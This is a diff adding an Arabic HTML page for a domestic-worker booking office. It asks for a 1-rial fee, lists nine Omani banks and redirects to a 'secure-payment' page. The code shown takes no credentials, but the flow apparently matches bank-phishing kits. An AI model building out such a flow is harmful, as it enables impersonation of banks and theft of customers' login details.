@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>تأكيد الحجز والدفع | مكتب مساعد</title>
+  <link rel="stylesheet" href="payment.css">
+</head>
+<body>
+  <main class="payment-page">
+    <header>
+      <a href="customer-details.html" aria-label="رجوع">←</a>
+      <h1>تأكيد عملية حجز العاملة</h1>
+      <p>الرسوم المطلوبة <strong>(1 ريال)</strong></p>
+    </header>
+    <section class="banks" aria-label="اختر البنك">
+      <article class="bank-card" data-bank="بنك العز الإسلامي"><div class="bank-logo iz">بنك العز الإسلامي<br><small>izz islamic bank</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="بنك نزوى"><div class="bank-logo niz">بنك نزوى<br><small>Bank Nizwa</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="البنك الوطني العماني"><div class="bank-logo nbo">NBO<br><small>البنك الوطني العماني</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="بنك عُمان العربي"><div class="bank-logo oab">بنك عُمان العربي<br><small>OMAN ARAB BANK</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="بنك ظفار"><div class="bank-logo dhofar">بنك ظفار<br><small>BankDhofar</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="صحار الإسلامي"><div class="bank-logo sohar">صحار<br><small>Sohar Islamic</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="الأهلي الإسلامي"><div class="bank-logo ahlii">الأهلي الإسلامي<br><small>ahli islamic</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="البنك الأهلي"><div class="bank-logo ahli">البنك الأهلي<br><small>ahlibank</small></div><button>اختيار</button></article>
+      <article class="bank-card" data-bank="بنك مسقط"><div class="bank-logo muscat">بنك مسقط<br><small>bank muscat</small></div><button>اختيار</button></article>
+    </section>
+  </main>
+  <script>
+    document.querySelectorAll('.bank-card button').forEach(button => button.addEventListener('click', () => {
+      const bank = button.closest('.bank-card').dataset.bank;
+      const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
+      draft.bank = bank;
+      localStorage.setItem('musaedDraft', JSON.stringify(draft));
+      window.location.href = `secure-payment.html?bank=${encodeURIComponent(bank)}`;
+    }));
+  </script>
+</body>
+</html>
